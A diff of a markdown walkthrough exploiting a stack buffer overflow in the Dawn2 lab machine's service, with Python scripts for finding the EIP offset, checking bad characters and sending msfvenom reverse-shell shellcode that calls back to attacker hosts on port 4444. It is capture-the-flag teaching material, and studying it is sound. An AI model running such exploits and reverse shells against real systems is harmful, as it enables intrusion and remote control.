@@ -104,7 +104,7 @@ and end it with a nullbyte as instructed by the message we found earlier. We sho
 
 
 ## Finding the Offset
-our 2nd poc script will contain a unique repeating pattern of characters so we can identify what memory address the program is crashing.
+our 2nd poc script will contain a unique repeating pattern of characters so we can identify where in memory the program is crashing.
 
 ``` bash
 ┌──(root💀kali)-[/home/kali/Documents/VULN/Dawn2]
@@ -142,7 +142,7 @@ if __name__ == "__main__":
     
 ```    
 
-Immunity Debugger shows us the EIP is overwritten with 316A4130 (our unique characters) that represent in ascii. We can find the offset with the pattern_offset tool built into mfsvenom:
+Immunity Debugger shows the EIP is overwritten with 316A4130, hexadecimal for 1jA0. We can find the offset with the pattern_offset tool in mfsvenom:
 
 ![offet](https://user-images.githubusercontent.com/76034874/181865840-625f8d1e-71e0-4987-bdd6-19bd7ca81eea.png)
 
@@ -154,16 +154,21 @@ Immunity Debugger shows us the EIP is overwritten with 316A4130 (our unique char
 [*] Exact match at offset 272
 ```
 
+Put another way, the program crashed when the 272th character of our pattern entered the buffer. 
+```bash
+% echo -n 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1' |wc -c
 
+276
+```
 
-Testing the offset calculation fro above and confirming we still control the EIP:
-We send  A's equal to the offset, add four B's and end it with a nullbyte for test3
+Testing the offset calculation from above and confirming we still control the EIP:
+Send  A's equal to the offset, add four B's and end with a nullbyte for test3:
 
 ```python
 #!/usr/bin/python3
 
 import socket,os,sys
-server = "10.0.2.40"   #server where immun debugger is Computer Name: Spidey
+server = "10.0.2.40"   #server where immun debugger is. Computer Name: Spidey
 port = 1985
 
 As = b'A'
@@ -188,20 +193,20 @@ if __name__ == "__main__":
 ```
 
 
-We can see the offset is correct because we have overwritten the EIP with B's (42424242)
+The offset is correct because we have overwritten the EIP with B's (42424242)
 
 ![bbbb](https://user-images.githubusercontent.com/76034874/181866355-54749141-e981-4f9a-ad50-ba9b632c9e7b.png)
 
 
 ## Testing "is there room for evil?  Our rev shell payload will be around 400 bytes.  Can we write this much to the buffer?
-We will send an additional byte-string of 400 Cs, representing our payload to make sure:
+We will send an additional byte-string of 400 Cs, representing our payload to confirm:
 
 
 ```python
 #!/usr/bin/python3
 
 import socket,os,sys
-server = "10.0.2.40"   #server where immun debugger is Computer Name: Spidey
+server = "10.0.2.40"   #server where immun debugger is. Computer Name: Spidey
 port = 1985
 
 As = b'A'
@@ -210,8 +215,6 @@ Cs = b'C' * 400
 offset = 272
 nullbyte = b'\x00'
 payload = As * offset + Bs + Cs + nullbyte
-
-
 print(payload)
 
 def main():
@@ -231,7 +234,7 @@ if __name__ == "__main__":
 ## Testing for Bad Characters. 
 ### The most common bad characters are x00,x0A,x0D, and xff due to the way the C language interprets these as 'special characters' instead of what we might intend.  We want to make sure msfvenom avoids using any we find while generating our payload, so it will run successfully.
 
-We have a list presaved and formated for python3 but they can also be found here: https://github.com/cytopia/badchars
+We have a list saved and formated for python3 but they can also be found here: https://github.com/cytopia/badchars
 or simply outputed to screen with this quick script:
 ```python
 #!/usr/bin/python
@@ -240,7 +243,7 @@ for x in range(1,256):
     print('\\x{:02x}'.format(x), end = '')
 ```    
 
-so this step will be to send our As plus offset + Bs + badchars + nullbyte:
+so this step will be send our As plus offset + Bs + badchars + nullbyte:
 
 ```python
 
@@ -290,7 +293,7 @@ def main():
 if __name__ == "__main__":
     main()    
 ```
-We are checking that every hex value from x00-FF is in order without any errors.  To do this right-click on the ESP and select Follow Dump from the menu.  Here it is good to go:
+We are checking that every hex value from x00-FF is in order without any errors.  To do this, right-click on the ESP and select Follow Dump from the menu.  Here it is good to go:
 
 
 ![badchar](https://user-images.githubusercontent.com/76034874/181870131-29d479b1-fb04-4e7d-a1ff-2dc5c950295c.png)
@@ -306,11 +309,10 @@ msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=10.0.2.30 LPORT=4444 -f py -b
 
 ```python
 
-
 #!/usr/bin/python3
 
 import socket,os,sys
-server = "10.0.2.40"   #server where immun debugger is Computer Name: Spidey
+server = "10.0.2.40"   #server where immun debugger is, Computer Name: Spidey
 port = 1985
 
 #msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=10.0.2.30 LPORT=4444 -f py -b '\x00' EXITFUNC=thread -v shellcode
@@ -348,7 +350,6 @@ shellcode += b"\xb9\xff\x43\xfa\x6b\x0a\xec\xa3\xfe\xb7\x71"
 shellcode += b"\x54\xd5\xf4\x8f\xd7\xdf\x84\x6b\xc7\xaa\x81"
 shellcode += b"\x30\x4f\x47\xf8\x29\x3a\x67\xaf\x4a\x6f"
 
-
 As = b'A'
 Bs = b'B' * 4
 
@@ -357,8 +358,6 @@ nullbyte = b'\x00'
 nops = b'\x90' * 16
 jmp_addr = b'\xba\x64\x59\x34'
 payload = As * offset + jmp_addr+ nops + shellcode + nops + nullbyte
-
-
 print(payload)
 
 def main():
@@ -373,7 +372,6 @@ if __name__ == "__main__":
     main()    
 ```
 
-
 ![revshell](https://user-images.githubusercontent.com/76034874/181870942-b910442c-0674-4e8b-8749-4a85c17f6adb.png)
 
 
@@ -381,6 +379,7 @@ if __name__ == "__main__":
 ## with our poc script working in our test environment, it's time to exploit our real target, the Dawn machine:
 change the server to the target IP
 generate shellcode to match the arch and OS of the target, namely linux and x86:
+
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.55.12 LPORT=4444 -f py -b "\x00" -v shellcode
 
 ```python
@@ -390,7 +389,6 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.55.12 LPORT=4444 -f py -b 
 import socket,os,sys
 server = "192.168.55.12"   #server where immun debugger is Computer Name: Spidey
 port = 1985
-
 
 shellcode =  b""
 shellcode += b"\xb8\x0f\xe6\x73\xc6\xda\xc4\xd9\x74\x24\xf4"
@@ -403,7 +401,6 @@ shellcode += b"\x79\x28\xfd\x42\xf3\x2f\xcc\xc5\x51\xc7\xa1"
 shellcode += b"\xea\x26\x7f\x56\xda\xe7\x1d\xcf\xad\x1b\xb3"
 shellcode += b"\x5c\x27\x3a\x83\x68\xfa\x3d"
 
-
 As = b'A'
 Bs = b'B' * 4
 
@@ -412,8 +409,6 @@ nullbyte = b'\x00'
 nops = b'\x90' * 16
 jmp_addr = b'\xba\x64\x59\x34'
 payload = As * offset + jmp_addr+ nops + shellcode + nops + nullbyte
-
-
 print(payload)
 
 def main():
@@ -432,14 +427,14 @@ if __name__ == "__main__":
 
 
 #Part2 BOF
-## We notice another .exe binary in the 1st directory we land in on the target.  We dowload it same as before to our machine and examine it to find it is the of the same type (x86 Little Endian Windows executable)
+## We notice another .exe binary in the 1st directory we land in on the target.  We download it same as before to our machine and examine it to find it is the same type (x86 Little Endian Windows executable).
 
 ```bash
 ┌──(root💀kali)-[/home/kali/Documents/VULN/Dawn2]
 └─# file dawn-BETA.exe                            
 dawn-BETA.exe: PE32 executable (console) Intel 80386, for MS Windows
 ```
-# Sending the As
+# Sending the As, 500 just like before
 
 ```python
 
@@ -448,6 +443,7 @@ port = 1435
 As = b'A' * 500
 Bs = b'B' * 4
 payload = As + nullbyte
+---snip---
 ```
 
 # Sending Unique Characters
